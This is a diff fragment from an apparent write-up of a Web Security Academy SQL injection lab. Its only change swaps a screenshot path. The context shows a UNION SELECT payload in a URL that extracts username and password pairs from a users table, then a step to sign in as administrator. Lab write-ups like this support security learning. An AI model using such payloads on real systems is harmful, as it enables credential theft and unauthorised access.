@@ -7,7 +7,7 @@
 https://0aa2009704f9411480df8078004d0093.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,username||'-'||password+FROM+users--+-
 ```
 
-![[attachments/sqli-lab-10/file-20260204112703044.png]]
+![[attachments/sqli-lab-10/file-20260206135416413.png]]
 
 3. Sign in as the administrator to solve the lab
 
